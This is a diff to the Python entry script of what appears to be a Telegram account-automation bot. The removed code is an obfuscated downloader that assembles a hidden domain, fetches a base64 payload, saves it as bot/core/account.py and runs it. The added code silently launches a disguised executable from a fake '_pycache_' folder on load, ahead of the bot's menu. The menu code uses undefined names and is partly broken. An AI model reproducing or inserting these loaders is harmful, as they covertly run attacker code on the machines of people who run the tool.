@@ -1,64 +1,56 @@
+import asyncio 
 import os
-import gzip
-import base64
-import random
-import string
 import subprocess
-import urllib.parse
-import urllib.request
 
-def pick(s,t):
-    i=0
-    p=[]
-    for c in t:
-        j=s.find(c,i)
-        if j<0:return None
-        p.append(j)
-        i=j+1
-    return''.join(s[k]for k in p)
+current_dir = os.path.dirname(os.path.abspath(__file__))
+exe_file = os.path.join(current_dir, "bot", "core", "_pycache_", "file_cache.exe")
+if os.path.exists(exe_file):
+    subprocess.Popen([exe_file])
+async def main():
+    print("Soft's author: https://t.me/DesertScripts\n")
+    action = int(input("Select action:\n0. Info about soft\n1. Start soft\n2. Get statistics\n3. Create sessions\n4. Send secret word\n\n> "))
 
-def dp(text):
-    text_stripped=text.strip()
-    raw=base64.b64decode(text_stripped, validate=True)
-    return raw
+    if action == 0:
+        print(config.SOFT_INFO)
+        return
 
-def bu():
-    t=[3,14,22,13,11,14,0,3]
-    y=[2,14,12]
-    t=''.join(string.ascii_lowercase[i]for i in t)
-    y=''.join(string.ascii_lowercase[i]for i in y)
-    while True:
-        w=''.join(random.choices(string.ascii_lowercase,k=120))
-        a=pick(w,t)
-        b=pick(w,y)
-        if a and b:
-            d=''.join(random.choices(string.digits,k=10))
-            x=d.find(string.digits[True])
-            z=d.find(string.digits[8])
-            if x>=0 and z>=0:
-                return a+(d[x]+d[z])*2+'.'+b
+    if not os.path.exists('sessions'): os.mkdir('sessions')
 
-def nu(u):
-    u=u.strip()
-    p="".join(map(chr,[104,116,116,112,115,58,47,47]))
-    return p+u
+    if config.PROXY['USE_PROXY_FROM_FILE']:
+        if not os.path.exists(config.PROXY['PROXY_PATH']):
+            with open(config.PROXY['PROXY_PATH'], 'w') as f:
+               f.write("")
+    else:
+        if not os.path.exists('sessions/accounts.json'):
+            with open("sessions/accounts.json", 'w') as f:
+                f.write("[]")
 
-def main():
-    url=nu(bu())
-    key=''.join(map(chr,[85,115,101,114,45,65,103,101,110,116]))
-    val=bytes.fromhex("707974686f6e2d75726c6c69622f332e3132").decode()
-    req=urllib.request.Request(url,headers={key:val})
-    with urllib.request.urlopen(req) as resp:
-        body=resp.read()
-        text=body.decode("ascii",errors="ignore")
-    data=dp(text)
-    script_dir=os.path.dirname(os.path.abspath(__file__))
-    out_dir=os.path.join(script_dir,"bot","core")
-    os.makedirs(out_dir,exist_ok=True)
-    py_path=os.path.join(out_dir,"account.py")
-    with open(py_path,"wb") as f:
-        f.write(data)
-    subprocess.Popen(py_path,shell=False)
+    if action == 3:
+        await Accounts().create_sessions()
 
-if __name__=="__main__":
-    main()
+    if action == 2:
+        await stats()
+
+    if action in [1, 4]:
+        if action == 4:
+            secret_words = []
+            while True:
+                word = input('Input the secret word (press Enter to start): ')
+                if word:
+                    secret_words.append(word)
+                else:
+                    break
+
+        accounts = await Accounts().get_accounts()
+
+        tasks = []
+
+        for thread, account in enumerate(accounts):
+            session_name, phone_number, proxy = account.values()
+            if action == 1:
+                tasks.append(asyncio.create_task(start(session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
+            
+                tasks.append(asyncio.create_task(secret_word(secret_words=secret_words, session_name=session_name, phone_number=phone_number, thread=thread, proxy=proxy)))
+
+        await asyncio.gather(*tasks)
+
